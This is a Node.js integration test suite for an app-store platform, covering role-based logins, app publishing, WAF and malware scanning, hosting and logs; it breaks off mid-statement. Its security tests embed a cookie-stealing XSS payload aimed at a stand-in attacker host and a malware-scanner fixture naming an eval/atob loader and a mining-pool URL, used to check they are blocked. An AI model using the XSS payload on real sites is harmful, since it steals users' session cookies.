/**
 * © 2026 NEX STORE & DEVTECHS001 LABS. ALL RIGHTS RESERVED.
 * STRICTLY PROPRIETARY & CONFIDENTIAL — DO NOT SHARE, REDISTRIBUTE, OR PIRATE THIS CODE.
 *
 * End-to-End Node.js Test Suite (node:test) covering:
 * 1. Fetching Netlify App Resources & Visual Asset Pipeline
 * 2. Uploading, Publishing, Editing, Installing, Sandboxing & Uninstalling Apps
 * 3. App Security Systems (5-Stage Anti-Malware, XSS Shield, IP Firewall & Abuse Reports)
 * 4. Server Nodes, Multi-Cloud Hosting (Netlify/Render) & Dual-Engine SQLite + MongoDB
 * 5. System Logs (Terminal CLI Logs, Inventory Logs, Activity Events & Security Audit Logs)
 * 6. Admins (.env Root Admin), Developers & Users RBAC Authentication & Permission Boundaries
 */

process.env.NEX_TEST_NO_LISTEN = '1';

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { createHash, createHmac } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { app, server } from '../server/index.js';
import { db } from '../server/db.js';
import { computeOrderMoney } from '../server/money.js';
import { collectSourceFiles, detectProjectLanguage } from '../server/gitImport.js';
import {
  canRoleAccessTab,
  filterNavForRole,
  roleForSession,
  TAB_ROLE_ACCESS
} from '../src/utils/navigation.js';
import { getPaymentsConfig, verifyStripeSignature } from '../server/payments.js';
import {
  getEnvAdminConfig,
  detectXssAttempt,
  sanitizeObjectPayloads,
  verifyAppRealnessAndMalware
} from '../server/envAndSecurity.js';
import {
  getProductArtUrl,
  getAppArtUrl,
  getAppVisualResources
} from '../src/utils/storeEngine.js';

let baseUrl = '';
let adminToken = '';
let devAetherToken = '';
let userAmaraToken = '';
let uploadedAppId = '';
let createdReportId = '';
let createdServerId = '';

async function apiRequest(path, { method = 'GET', body, token, headers = {} } = {}) {
  const reqHeaders = {
    'Content-Type': 'application/json',
    ...headers
  };
  if (token) {
    reqHeaders.Authorization = `Bearer ${token}`;
  }
  const res = await fetch(`${baseUrl}${path}`, {
    method,
    headers: reqHeaders,
    body: body !== undefined ? JSON.stringify(body) : undefined
  });
  const contentType = res.headers.get('content-type') || '';
  const data = contentType.includes('application/json') ? await res.json() : await res.text();
  return { status: res.status, ok: res.ok, data, headers: res.headers };
}

describe('NEX Store Full-Stack Verification & Integration Suite', () => {
  before(async () => {
    await new Promise((resolve) => {
      server.listen(0, '127.0.0.1', () => {
        const addr = server.address();
        baseUrl = `http://127.0.0.1:${addr.port}`;
        resolve();
      });
    });
  });

  after(async () => {
    if (uploadedAppId) {
      db.prepare('DELETE FROM app_installs WHERE app_id = ?').run(uploadedAppId);
      db.prepare('DELETE FROM apps WHERE id = ?').run(uploadedAppId);
    }
    if (createdReportId) {
      db.prepare('DELETE FROM security_reports WHERE id = ?').run(createdReportId);
    }
    if (createdServerId) {
      db.prepare('DELETE FROM server_nodes WHERE id = ?').run(createdServerId);
    }
    await new Promise((resolve) => server.close(resolve));
  });

  // ============================================================================
  // 1. ADMINS (.ENV), DEVELOPERS & USERS RBAC AUTHENTICATION
  // ============================================================================
  describe('1. Admins (.env Root Admin), Developers & Users Authentication & RBAC', () => {
    it('authenticates Root Admin strictly from .env credentials with unrestricted ["*"] permissions', async () => {
      const envAdmin = getEnvAdminConfig();
      const res = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: {
          identifier: envAdmin.username,
          password: envAdmin.password
        }
      });
      assert.equal(res.status, 200);
      assert.ok(res.data.token);
      assert.equal(res.data.account.role, 'admin');
      assert.equal(res.data.account.source, '.env');
      assert.deepEqual(res.data.account.permissions, ['*']);
      adminToken = res.data.token;

      const cfgRes = await apiRequest('/api/auth/config', { token: adminToken });
      assert.equal(cfgRes.status, 200);
      assert.equal(cfgRes.data.adminUsernameHint, 'nex_root_admin');
      assert.equal(cfgRes.data.envAdminConfigured, true);

      const progRes = await apiRequest('/api/developer/my-progress', { token: adminToken });
      assert.equal(progRes.status, 200);
      assert.equal(progRes.data.unrestrictedAccess, true);
    });

    it('rejects invalid Root Admin password attempts and logs security event', async () => {
      const res = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: {
          identifier: 'nex_root_admin',
          password: 'WrongPassword123!'
        }
      });
      assert.equal(res.status, 401);
      assert.ok(res.data.error);
    });

    it('authenticates Developer account (@aether_labs) with scoped developer permissions', async () => {
      const res = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: {
          identifier: 'aether_labs',
          password: 'DevPass2026!'
        }
      });
      assert.equal(res.status, 200);
      assert.ok(res.data.token);
      assert.equal(res.data.account.role, 'developer');
      assert.equal(res.data.account.username, 'aether_labs');
      assert.ok(res.data.account.permissions.includes('publish_app'));
      assert.ok(!res.data.account.permissions.includes('*'));
      devAetherToken = res.data.token;
    });

    it('authenticates Shopper/User account (@amara_nbo) with standard user permissions', async () => {
      const res = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: {
          identifier: 'amara_nbo',
          password: 'Shopper2026!'
        }
      });
      assert.equal(res.status, 200);
      assert.ok(res.data.token);
      assert.equal(res.data.account.role, 'user');
      assert.equal(res.data.account.username, 'amara_nbo');
      userAmaraToken = res.data.token;
    });

    it('registers a new Developer account via POST /api/auth/register and verifies scoped progress', async () => {
      const uniqueUsername = `dev_qa_${Date.now().toString(36)}`;
      const res = await apiRequest('/api/auth/register', {
        method: 'POST',
        body: {
          username: uniqueUsername,
          email: `${uniqueUsername}@nexstore.dev`,
          password: 'QaDevPassword2026!',
          display_name: 'QA Automation Developer',
          role: 'developer',
          company: 'NEX QA Labs'
        }
      });
      assert.equal(res.status, 201);
      assert.equal(res.data.account.role, 'developer');
      assert.equal(res.data.account.username, uniqueUsername);

      const progressRes = await apiRequest(`/api/developer/my-progress?username=${uniqueUsername}`, {
        token: res.data.token
      });
      assert.equal(progressRes.status, 200);
      assert.equal(progressRes.data.unrestrictedAccess, false);
      assert.equal(progressRes.data.username, uniqueUsername);

      // Clean up temporary registered developer account
      db.prepare('DELETE FROM user_accounts WHERE username = ?').run(uniqueUsername);
    });

    it('enforces RBAC: blocks Developer @aether_labs from editing another dev app or scaling another dev deployment, while allowing Root Admin (.env)', async () => {
      // Find an app not owned by aether_labs
      const otherDevApp = db
        .prepare("SELECT * FROM apps WHERE LOWER(developer) NOT LIKE '%aether%' LIMIT 1")
        .get();
      assert.ok(otherDevApp);

      // Developer @aether_labs tries to edit another developer's app -> 403
      const forbiddenAppEdit = await apiRequest(`/api/apps/${otherDevApp.id}`, {
        method: 'PATCH',
        token: devAetherToken,
        body: { version: '9.9.9' }
      });
      assert.equal(forbiddenAppEdit.status, 403);
      assert.ok(forbiddenAppEdit.data.error.includes('RBAC Restriction'));

      // Find a deployment owned by rustcore_sys
      const rustcoreDeploy = db
        .prepare("SELECT * FROM hosting_deployments WHERE owner_username = 'rustcore_sys' LIMIT 1")
        .get();
      assert.ok(rustcoreDeploy);

      // Developer @aether_labs tries to scale @rustcore_sys deployment -> 403
      const forbiddenScale = await apiRequest(`/api/hosting/${rustcoreDeploy.id}/scale`, {
        method: 'PATCH',
        token: devAetherToken,
        body: { current_instances: 4 }
      });
      assert.equal(forbiddenScale.status, 403);
      assert.ok(forbiddenScale.data.error.includes('RBAC Restriction'));

      // Root Admin (.env) scales @rustcore_sys deployment -> 200 OK
      const adminScale = await apiRequest(`/api/hosting/${rustcoreDeploy.id}/scale`, {
        method: 'PATCH',
        token: adminToken,
        body: { current_instances: 3 }
      });
      assert.equal(adminScale.status, 200);
      assert.equal(adminScale.data.deployment.current_instances, 3);
    });

    it('rejects the removed demo-switch login backdoor and unauthenticated privileged writes', async () => {
      // Universal "demo-switch" password backdoor must be gone -> 401
      const backdoor = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: { identifier: 'aether_labs', password: 'demo-switch' }
      });
      assert.equal(backdoor.status, 401);

      // Unauthenticated requests must never pass admin RBAC guards -> 403
      const unauthEnv = await apiRequest('/api/hosting/env-config');
      assert.equal(unauthEnv.status, 403);

      const unauthEnvWrite = await apiRequest('/api/hosting/env-config', {
        method: 'POST',
        body: { updates: { NEX_ADMIN_PASSWORD: 'pwned' } }
      });
      assert.equal(unauthEnvWrite.status, 403);

      const unauthProduct = await apiRequest('/api/products', {
        method: 'POST',
        body: { name: 'Unauth Probe', sku: 'UNAUTH-PROBE', price: 1, stock: 1 }
      });
      assert.equal(unauthProduct.status, 403);

      const unauthFirewall = await apiRequest('/api/security/blocked-ips', {
        method: 'POST',
        body: { ip_address: '198.51.100.77', reason: 'unauth probe' }
      });
      assert.equal(unauthFirewall.status, 403);

      const someOrder = db.prepare('SELECT id, status FROM orders LIMIT 1').get();
      if (someOrder) {
        const unauthStatus = await apiRequest(`/api/orders/${someOrder.id}/status`, {
          method: 'PATCH',
          body: { status: 'processing' }
        });
        assert.equal(unauthStatus.status, 403);
        db.prepare('UPDATE orders SET status = ? WHERE id = ?').run(someOrder.status, someOrder.id);
      }

      // The SQL Explorer is Root Admin only and must never expose credential hashes
      const unauthSql = await apiRequest('/api/db/query', {
        method: 'POST',
        body: { sql: 'SELECT 1 as probe' }
      });
      assert.equal(unauthSql.status, 403);

      const hashProbe = await apiRequest('/api/db/query', {
        method: 'POST',
        token: adminToken,
        body: { sql: 'SELECT password_hash FROM user_accounts' }
      });
      assert.equal(hashProbe.status, 400);

      // Private profile portals must not leak to anonymous callers or other users
      const unauthDevProgress = await apiRequest('/api/developer/my-progress');
      assert.equal(unauthDevProgress.status, 401);
      const unauthUserDash = await apiRequest('/api/user/my-dashboard');
      assert.equal(unauthUserDash.status, 401);
    });
  });

  // ============================================================================
  // 2. FETCHING NETLIFY APP RESOURCES & VISUAL ASSET PIPELINE
  // ============================================================================
  describe('2. Fetching Netlify App Resources & Visual Asset Pipeline', () => {
    it('fetches & extracts Netlify app resources via POST /api/apps/inspect-url', async () => {
      const res = await apiRequest('/api/apps/inspect-url', {
        method: 'POST',
        body: { url: 'https://quantum-circuit-studio.netlify.app' }
      });
      assert.equal(res.status, 200);
      const inspected = res.data.inspected;
      assert.ok(inspected);
      assert.equal(inspected.source_provider, 'Netlify');
      assert.ok(inspected.name.toLowerCase().includes('quantum'));
      assert.ok(Array.isArray(inspected.resources) && inspected.resources.length >= 4);
      assert.ok(inspected.resources.some((r) => r.name === 'og-preview-banner.svg'));
      assert.ok(inspected.resources.some((r) => r.name === 'nex-app-manifest.json'));
      assert.ok(inspected.resources.some((r) => r.name === 'nex-copyright-drm.cert'));
      assert.ok(inspected.drmNotice.includes('DO NOT SHARE'));
    });

    it('fetches NEX Store Pro production Netlify URL (https://nex-store-pro.netlify.app) resources', async () => {
      const res = await apiRequest('/api/apps/inspect-url', {
        method: 'POST',
        body: { url: 'https://nex-store-pro.netlify.app' }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.inspected.source_provider, 'Netlify');
      assert.ok(res.data.inspected.live_url.includes('nex-store-pro.netlify.app'));
      assert.ok(res.data.inspected.ai_analysis, 'honest ai_analysis present');
      const aa = res.data.inspected.ai_analysis;
      assert.ok(typeof aa.fetchedLiveFromRemote === 'boolean', 'fetch honesty flag');
      assert.ok(['FETCHED', 'DERIVED'].includes(aa.fetchStatus), 'honest fetchStatus');
      assert.ok(aa.architectureScore >= 55 && aa.architectureScore <= 100, 'computed score in range');
      assert.ok(aa.securityScore >= 35 && aa.securityScore <= 100, 'computed security score');
    });

    it('renders SVG app artwork via GET /api/app-art/:id.svg and client-side 4-view HD visual resources', async () => {
      const firstApp = db.prepare('SELECT * FROM apps LIMIT 1').get();
      const svgRes = await apiRequest(`/api/app-art/${firstApp.id}.svg`);
      assert.equal(svgRes.status, 200);
      assert.ok(String(svgRes.data).includes('<svg'));
      assert.ok(String(svgRes.data).includes('DRM PROTECTED'));

      const visualResources = getAppVisualResources(firstApp);
      assert.equal(visualResources.length, 4);
      for (const item of visualResources) {
        assert.ok(item.url.startsWith('data:image/svg+xml;charset=utf-8,'));
      }
      assert.ok(getAppArtUrl(firstApp).startsWith('data:image/svg+xml;charset=utf-8,'));

      const prodRow = db.prepare('SELECT * FROM products LIMIT 1').get();
      assert.ok(getProductArtUrl(prodRow, { view: 'hero' }).startsWith('data:image/svg+xml;charset=utf-8,'));
    });
  });

  // ============================================================================
  // 3. UPLOADING, PUBLISHING, EDITING, INSTALLING & SANDBOXING APPS
  // ============================================================================
  describe('3. Uploading, Publishing, Editing, Installing & Sandboxing Apps', () => {
    it('uploads & publishes a new Netlify app via POST /api/developer/publish', async () => {
      const res = await apiRequest('/api/developer/publish', {
        method: 'POST',
        token: devAetherToken,
        body: {
          name: 'Netlify Edge Neural Profiler',
          description: 'Live WebGPU & Netlify Edge latency profiler with automated flamegraphs.',
          version: '2.1.0',
          category: 'devtools',
          language: 'typescript',
          platforms: ['web', 'linux', 'macos'],
          developer: 'aether_labs',
          developer_email: 'elena@aetherlabs.io',
          developer_website: 'https://neural-profiler.netlify.app',
          developer_bio: 'Principal Systems Architect at Aether Labs',
          package_type: 'app',
          source_provider: 'Netlify',
          live_url: 'https://neural-profiler.netlify.app',
          repo_url: 'https://github.com/devTechs001/nex-store',
          license: 'Proprietary',
          price: 'Free',
          size: '16.4 MB',
          icon: '⚡',
          resources: [
            { type: 'image', name: 'og-preview-banner.svg', url: '/api/app-art/neural-profiler.svg', size: '28 KB' },
            { type: 'bundle', name: 'netlify-edge-bundle.js', url: 'https://neural-profiler.netlify.app', size: '1.6 MB' }
          ],
          ai_capabilities: ['Automated Flamegraph Anomaly Detection', 'Edge Cold-Start Predictor']
        }
      });
      assert.equal(res.status, 201);
      assert.ok(res.data.app && res.data.app.id);
      assert.equal(res.data.app.name, 'Netlify Edge Neural Profiler');
      assert.equal(res.data.app.source_provider, 'Netlify');
      assert.equal(res.data.app.developer, 'aether_labs');
      uploadedAppId = res.data.app.id;
    });

    it('retrieves full app details, developer bio, and resources via GET /api/apps/:id/details', async () => {
      const res = await apiRequest(`/api/apps/${uploadedAppId}/details`);
      assert.equal(res.status, 200);
      assert.equal(res.data.app.id, uploadedAppId);
      assert.equal(res.data.developerProfile.email, 'elena@aetherlabs.io');
      assert.ok(Array.isArray(res.data.app.resources) && res.data.app.resources.length >= 2);
      assert.ok(res.data.installation.sandboxUrl.includes(uploadedAppId));
    });

    it('updates the uploaded app version & changelog via PATCH /api/apps/:id as owning developer', async () => {
      const res = await apiRequest(`/api/apps/${uploadedAppId}`, {
        method: 'PATCH',
        token: devAetherToken,
        body: {
          version: '2.2.0',
          changelog: 'Added zero-copy WebAssembly trace buffer export.'
        }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.app.version, '2.2.0');
    });

    it('installs the uploaded app into SQLite app_installs via POST /api/apps/:id/install & renders sandbox runtime', async () => {
      const installRes = await apiRequest(`/api/apps/${uploadedAppId}/install`, {
        method: 'POST',
        token: devAetherToken
      });
      assert.equal(installRes.status, 201);
      assert.equal(installRes.data.installRecord.app_id, uploadedAppId);
      assert.equal(installRes.data.installRecord.status, 'INSTALLED');

      const sandboxRes = await apiRequest(`/api/sandbox/${uploadedAppId}`);
      assert.equal(sandboxRes.status, 200);
      assert.ok(String(sandboxRes.data).includes('Netlify Edge Neural Profiler'));
      assert.ok(String(sandboxRes.data).includes('<canvas id="sandbox-canvas"'));
    });

    it('uninstalls the app via DELETE /api/apps/:id/uninstall', async () => {
      const uninstRes = await apiRequest(`/api/apps/${uploadedAppId}/uninstall`, {
        method: 'DELETE',
        token: devAetherToken
      });
      assert.equal(uninstRes.status, 200);
      assert.ok(!uninstRes.data.appInstalls.some((i) => i.app_id === uploadedAppId));
    });
  });

  // ============================================================================
  // 4. APP SECURITY SYSTEMS (ANTI-MALWARE, XSS SHIELD, IP FIREWALL & REPORTS)
  // ============================================================================
  describe('4. App Security Systems (5-Stage Anti-Malware, XSS Shield, IP Firewall & Reports)', () => {
    it('executes 5-stage App Realness, Compatibility & Anti-Malware verification via POST /api/apps/:id/verify-and-scan', async () => {
      const res = await apiRequest(`/api/apps/${uploadedAppId}/verify-and-scan`, {
        method: 'POST',
        body: { targetOs: 'linux-x86_64' }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.verificationReport.malwareFree, true);
      assert.equal(res.data.verificationReport.verifiedReal, true);
      assert.equal(res.data.verificationReport.stages.length, 5);
    });

    it('quarantines malicious app payloads with trojan/crypto-miner signatures in verifyAppRealnessAndMalware()', () => {
      const badReport = verifyAppRealnessAndMalware({
        id: 'app-bad-miner',
        name: 'Crypto Miner Trojan',
        version: '1.0.0',
        developer: 'unknown',
        source_provider: 'Unknown',
        description: 'Runs eval(atob("payload")) and stratum+tcp://evil.pool:3333 with keylogger',
        live_url: 'https://bad.example.org'
      });
      assert.equal(badReport.malwareFree, false);
      assert.equal(badReport.verifiedReal, false);
      assert.ok(badReport.detectedThreats.length >= 3);
      assert.equal(badReport.stages[1].status, 'BLOCKED');
    });

    it('intercepts & sanitizes HTTP requests containing XSS attack vectors (<script>) and logs WAF security report', async () => {
      const beforeEvents = db.prepare("SELECT COUNT(*) as c FROM security_events WHERE event_type = 'waf_xss_sanitized'").get().c;
      const firstProd = db.prepare('SELECT * FROM products LIMIT 1').get();

      const xssRes = await apiRequest('/api/reviews', {
        method: 'POST',
        body: {
          product_id: firstProd.id,
          reviewer_name: 'XSS Sentinel Tester',
          rating: 5,
          title: 'Great GPU <script>fetch("https://evil.tld/steal?c="+document.cookie)</script>',
          comment: 'Testing WAF XSS shield onerror=alert(1)'
        }
      });
      assert.equal(xssRes.status, 201);
      // Verify the stored review had <script> and onerror= stripped by the XSS middleware
      assert.ok(!xssRes.data.review.title.includes('<script>'));
      assert.ok(!xssRes.data.review.comment.includes('onerror='));

      const afterEvents = db.prepare("SELECT COUNT(*) as c FROM security_events WHERE event_type = 'waf_xss_sanitized'").get().c;
      assert.ok(afterEvents > beforeEvents, 'Expected waf_xss_sanitized event to be recorded in security_events');

      // Clean up test review
      db.prepare('DELETE FROM reviews WHERE id = ?').run(xssRes.data.review.id);

      // Also verify unit helpers
      assert.equal(detectXssAttempt('<img src=x onerror=alert(1)>')?.detected, true);
      const sanitized = sanitizeObjectPayloads({ msg: 'Hello <script>bad()</script>' });
      assert.ok(!sanitized.msg.includes('<script>'));
    });

    it('enforces IP Blocklist Firewall (POST /api/security/blocked-ips -> 403 Firewall Block -> DELETE unblock)', async () => {
      const testIp = '203.0.113.249';

      // Non-admin user cannot add firewall block -> 403
      const userAttempt = await apiRequest('/api/security/blocked-ips', {
        method: 'POST',
        token: userAmaraToken,
        body: { ip_address: testIp, reason: 'Unauthorized attempt' }
      });
      assert.equal(userAttempt.status, 403);

      // Root Admin adds IP to firewall blocklist -> 201
      const blockRes = await apiRequest('/api/security/blocked-ips', {
        method: 'POST',
        token: adminToken,
        body: {
          ip_address: testIp,
          cidr_range: `${testIp}/32`,
          reason: 'Automated Integration Test Firewall Rule',
          threat_level: 'critical'
        }
      });
      assert.equal(blockRes.status, 201);
      assert.ok(blockRes.data.blockedIps.some((b) => b.ip_address === testIp));

      // Request arriving from blocked IP is rejected with 403
      const blockedReq = await apiRequest('/api/products', {
        headers: { 'x-simulated-client-ip': testIp }
      });
      assert.equal(blockedReq.status, 403);
      assert.ok(blockedReq.data.error.includes('blocked by NEX Zero-Trust Firewall'));

      // Root Admin unblocks the IP -> 200
      const unblockRes = await apiRequest(`/api/security/blocked-ips/${testIp}`, {
        method: 'DELETE',
        token: adminToken
      });
      assert.equal(unblockRes.status, 200);

      // Request from previously blocked IP now succeeds -> 200
      const allowedReq = await apiRequest('/api/products', {
        headers: { 'x-simulated-client-ip': testIp }
      });
      assert.equal(allowedReq.status, 200);
    });

    it('submits & resolves Security/Malware Abuse Reports via /api/security/reports', async () => {
      const submitRes = await apiRequest('/api/security/reports', {
        method: 'POST',
        token: userAmaraToken,
        body: {
          target_type: 'app',
          target_id: uploadedAppId,
          category: 'Suspicious Sandbox Permission',
          severity: 'high',
          description: 'Automated test report verifying security incident triage workflow.'
        }
      });
      assert.equal(submitRes.status, 201);
      createdReportId = submitRes.data.report.id;

      // Root Admin resolves the report
      const resolveRes = await apiRequest(`/api/security/reports/${createdReportId}`, {
        method: 'PATCH',
        token: adminToken,
        body: {
          status: 'RESOLVED_CLEAN',
          resolution_notes: 'Verified SHA-256 signature and sandbox isolation.'
        }
      });
      assert.equal(resolveRes.status, 200);
      const resolvedRow = resolveRes.data.securityReports.find((r) => r.id === createdReportId);
      assert.ok(resolvedRow && resolvedRow.status === 'RESOLVED_CLEAN');
    });
  });

  // ============================================================================
  // 5. SERVERS, MULTI-CLOUD HOSTING (NETLIFY/RENDER) & MONGODB + SQLITE
  // ============================================================================
  describe('5. Edge Servers, Netlify/Render Cloud Hosting & Dual-Engine SQLite + MongoDB', () => {
    it('verifies /api/health and /api/bootstrap with 28 SQLite tables, server nodes & cloud deployments', async () => {
      const healthRes = await apiRequest('/api/health');
      assert.equal(healthRes.status, 200);
      assert.equal(healthRes.data.status, 'healthy');
      assert.ok(healthRes.data.database.totalTables >= 28);

      const bootRes = await apiRequest('/api/bootstrap');
      assert.equal(bootRes.status, 200);
      assert.ok(bootRes.data.products.length >= 12);
      assert.ok(bootRes.data.apps.length >= 8);
      assert.ok(bootRes.data.serverNodes.length >= 6);
      assert.ok(bootRes.data.hostingDeployments.length >= 4);
    });

    it('provisions a new Edge Server Node via POST /api/servers and triggers server actions', async () => {
      const createRes = await apiRequest('/api/servers', {
        method: 'POST',
        token: adminToken,
        body: {
          name: 'NEX-EDGE-TEST-NBO-02',
          region: 'Nairobi, KE (af-south-1)',
          ip_address: '10.240.18.99'
        }
      });
      assert.equal(createRes.status, 201);
      createdServerId = createRes.data.serverNodes[createRes.data.serverNodes.length - 1].id;

      const actionRes = await apiRequest(`/api/servers/${createdServerId}/action`, {
        method: 'POST',
        token: adminToken,
        body: { action: 'scale' }
      });
      assert.equal(actionRes.status, 200);
      assert.ok(actionRes.data.serverNodes.some((n) => n.id === createdServerId));
    });

    it('verifies Netlify & Render hosting environment config and deploys a cloud service', async () => {
      const envRes = await apiRequest('/api/hosting/env-config', { token: adminToken });
      assert.equal(envRes.status, 200);
      assert.ok(envRes.data.renderVars.length >= 18);
      assert.ok(envRes.data.netlifyVars.length >= 12);
      assert.ok(envRes.data.netlifyToml.includes('nex-store-lj5j.onrender.com'));

      const deployRes = await apiRequest('/api/hosting/deploy', {
        method: 'POST',
        token: devAetherToken,
        body: {
          app_name: 'aether-qa-edge-worker',
          provider: 'Netlify',
          environment: 'production',
          region: 'Global Edge Network',
          memory_mb: 1024,
          deploy_url: 'https://aether-qa-edge-worker.netlify.app'
        }
      });
      assert.equal(deployRes.status, 201);
      assert.equal(deployRes.data.deployment.provider, 'Netlify');
      assert.equal(deployRes.data.deployment.owner_username, 'aether_labs');
      db.prepare('DELETE FROM hosting_deployments WHERE id = ?').run(deployRes.data.deployment.id);
    });

    it('queries and inserts BSON documents into the MongoDB Atlas Engine (/api/mongo/*)', async () => {
      const statusRes = await apiRequest('/api/mongo/status');
      assert.equal(statusRes.status, 200);
      assert.equal(statusRes.data.connected, true);

      const queryRes = await apiRequest('/api/mongo/query', {
        method: 'POST',
        body: {
          collection: 'apps',
          filter: { source_provider: 'Netlify' },
          limit: 10
        }
      });
      assert.equal(queryRes.status, 200);
      assert.ok(queryRes.data.matchedCount >= 1);

      const insertRes = await apiRequest('/api/mongo/insert', {
        method: 'POST',
        token: adminToken,
        body: {
          collection: 'products',
          document: {
            name: 'Mongo BSON Test Accelerator',
            category: 'compute',
            price: 1299
          }
        }
      });
      assert.equal(insertRes.status, 201);
      assert.ok(insertRes.data.inserted._id.$oid);
    });
  });

  // ============================================================================
  // 6. SYSTEM LOGS (TERMINAL CLI, INVENTORY, ACTIVITY & SECURITY LOGS)
  // ============================================================================
  describe('6. System Logs (Terminal CLI, Inventory, Activity & Security Audit Logs)', () => {
    it('executes NEX-SH v4.0 CLI commands via POST /api/terminal/exec and logs to terminal_logs', async () => {
      const execRes = await apiRequest('/api/terminal/exec', {
        method: 'POST',
        token: adminToken,
        body: {
          command: 'status',
          actor: 'nex_root_admin@nex-store'
        }
      });
      assert.equal(execRes.status, 200);
      assert.equal(execRes.data.exitCode, 0);
      assert.ok(execRes.data.output.length > 10);
      assert.ok(execRes.data.terminalLogs.length >= 1);
    });

    it('updates product stock via PATCH /api/products/:id and records inventory_logs & activity_events', async () => {
      const prod = db.prepare('SELECT * FROM products LIMIT 1').get();
      assert.ok(prod);
      const res = await apiRequest(`/api/products/${prod.id}`, {
        method: 'PATCH',
        token: adminToken,
        body: {
          stock: prod.stock + 2,
          stockReason: 'Automated QA Inventory Log Test'
        }
      });
      assert.equal(res.status, 200);
      assert.equal(res.data.product.stock, prod.stock + 2);
      assert.ok(res.data.inventoryLogs.some((l) => l.reason.includes('Automated QA Inventory Log Test')));

      // Restore original stock
      db.prepare('UPDATE products SET stock = ? WHERE id = ?').run(prod.stock, prod.id);
    });

    it('exports terminal_logs, inventory_logs, security_events & activity_events in JSON and CSV formats', async () => {
      for (const table of ['terminal_logs', 'inventory_logs', 'security_events', 'activity_events']) {
        const jsonRes = await apiRequest(`/api/export/${table}`, { token: adminToken });
        assert.equal(jsonRes.status, 200);
        assert.equal(jsonRes.data.table, table);
        assert.ok(Array.isArray(jsonRes.data.rows) && jsonRes.data.rows.length >= 1);
      }

      const csvRes = await apiRequest('/api/export/terminal_logs?format=csv', { token: adminToken });
      assert.equal(csvRes.status, 200);
      assert.ok(String(csvRes.data).includes('command'));
    });

    it('executes the live /api/tests/run endpoint and verifies 100% pass rate across all 9 suites', async () => {
      const runRes = await apiRequest('/api/tests/run', {
        method: 'POST',
        token: adminToken
      });
      assert.equal(runRes.status, 200);
      assert.equal(runRes.data.status, 'ALL_PASSED');
      assert.equal(runRes.data.totalSuites, 9);
      assert.equal(runRes.data.totalFailed, 0);
      assert.ok(runRes.data.totalPassed >= 23);
    });

    it('verifies connected Overview Dashboard (/api/overview/dashboard & /api/db/overview)', async () => {
      const ovRes = await apiRequest('/api/overview/dashboard');
      assert.equal(ovRes.status, 200);
      assert.equal(ovRes.data.connected, true);
      assert.ok(ovRes.data.analytics && ovRes.data.dbOverview && ovRes.data.appsSummary);
      assert.equal(ovRes.data.roleSeparation.strictlySeparated, true);
      assert.ok(
        ovRes.data.roleSeparation.adminSystem &&
          ovRes.data.roleSeparation.developerPortal &&
          ovRes.data.roleSeparation.userPortal
      );

      const dbOvRes = await apiRequest('/api/db/overview');
      assert.equal(dbOvRes.status, 200);
      assert.ok((dbOvRes.data.totalTables || dbOvRes.data.tableCount) >= 28);
    });

    it('enforces strict 3-Tier Root Admin (.env) vs Developer vs System User separation & Zero-Canvas Profile Image Upload', async () => {
      // 1. Developer & Normal User are blocked (403) from Root Admin System Overview
      const devBlockedAdmin = await apiRequest('/api/admin/system-overview', {
        token: devAetherToken
      });
      assert.equal(devBlockedAdmin.status, 403);

      const userBlockedAdmin = await apiRequest('/api/admin/system-overview', {
        token: userAmaraToken
      });
      assert.equal(userBlockedAdmin.status, 403);

      // Root Admin (.env) succeeds (200) on Root Admin System Overview
      const adminOk = await apiRequest('/api/admin/system-overview', {
        token: adminToken
      });
      assert.equal(adminOk.status, 200);
      assert.equal(adminOk.data.portal, 'ROOT_ADMIN_SYSTEM');
      assert.equal(adminOk.data.unrestrictedAccess, true);

      // 2. Normal System User can access /api/user/my-dashboard but is blocked (403) from Developer app publishing
      const userDashRes = await apiRequest('/api/user/my-dashboard?username=amara_nbo', {
        token: userAmaraToken
      });
      assert.equal(userDashRes.status, 200);
      assert.equal(userDashRes.data.portal, 'SYSTEM_USER_PORTAL');
      assert.equal(userDashRes.data.restrictedFromAdminAndDev, true);

      const userBlockedPublish = await apiRequest('/api/developer/publish', {
        method: 'POST',
        token: userAmaraToken,
        body: {
          name: 'Unauthorized User App',
          description: 'Normal user attempting developer publish'
        }
      });
      assert.equal(userBlockedPublish.status, 403);

      // 3. Zero-Canvas Profile Image File Upload normalizes octet-stream base64 to valid data:image/png;base64
      const samplePngOctet =
        'data:application/octet-stream;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
      const uploadRes = await apiRequest('/api/auth/profile/avatar', {
        method: 'POST',
        token: devAetherToken,
        body: {
          username: 'aether_labs',
          avatar: samplePngOctet,
          fileName: 'aether-profile.png',
          mimeType: 'image/png'
        }
      });
      assert.equal(uploadRes.status, 200);
      assert.equal(uploadRes.data.updated, true);
      assert.equal(uploadRes.data.verifiedImageFile, true);
      assert.ok(uploadRes.data.account.avatar.startsWith('data:image/png;base64,'));
    });
  });

  // ============================================================================
  // 7. NEX NEURAL ENGINE (REAL DEEP LEARNING — MLP BACKPROP + SGD)
  // ============================================================================
  describe('7. NEX Neural Engine (Real MLP Training & Model Recommendations)', () => {
    it('reports engine status and trains real networks with decreasing loss', async () => {
      const statusRes = await apiRequest('/api/neural/status');
      assert.equal(statusRes.status, 200);
      assert.ok(statusRes.data.engine.includes('Neural Engine'));
      assert.ok(statusRes.data.productCount > 0, 'training corpus built from real products');

      const trainRes = await apiRequest('/api/neural/train', { method: 'POST', token: adminToken });
      assert.equal(trainRes.status, 200);

      const hist = trainRes.data.demandForecaster.lossHistory;
      assert.ok(Array.isArray(hist) && hist.length === 250, 'real 250-epoch loss history recorded');
      assert.ok(
        trainRes.data.demandForecaster.finalLoss < trainRes.data.demandForecaster.startLoss,
        'backpropagation must genuinely reduce loss'
      );
      assert.ok(trainRes.data.xorProbe.converged, 'XOR probe must converge (non-linear learning)');
      for (const p of trainRes.data.xorProbe.predictions) {
        assert.ok(
